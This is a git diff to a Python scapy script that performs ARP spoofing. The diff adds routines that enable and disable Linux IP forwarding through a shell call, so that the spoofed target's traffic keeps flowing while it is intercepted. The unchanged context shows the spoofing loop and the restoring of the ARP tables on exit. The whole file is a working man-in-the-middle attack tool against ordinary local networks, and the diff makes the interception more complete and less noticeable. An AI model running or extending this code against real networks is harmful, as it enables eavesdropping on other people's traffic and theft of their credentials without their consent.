@@ -3,6 +3,13 @@ import scapy.all as scapy
 import time
 import sys
 import argparse
+import subprocess
+
+def routing_enable():
+    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
+
+def routing_disable():
+    subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
 
 def get_ips():
     parser = argparse.ArgumentParser()
@@ -30,6 +37,7 @@ def restore(dst_ip, src_ip):
     packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=get_mac_address(dst_ip), psrc=src_ip, hwsrc=get_mac_address(src_ip))
     scapy.send(packet, count=4, verbose=False)
 
+routing_enable()
 args = get_ips()
 target_ip = args.target
 router_ip = args.router
@@ -43,6 +51,10 @@ try:
         print("\r[+] Packets sent: ", str(packets_amount), end="")
         time.sleep(2)
 except KeyboardInterrupt:
-    print("\n[+] Program has been stopped, ARP tables will be reseted")
+    print("\n[+] Program has been stopped, ARP tables will be reseted\n")
     restore(target_ip, router_ip)
     restore(router_ip, target_ip)
+    routing_disable()
+except IndexError:
+    print("\n[+] Something went wrong...\n")
+    routing_disable()
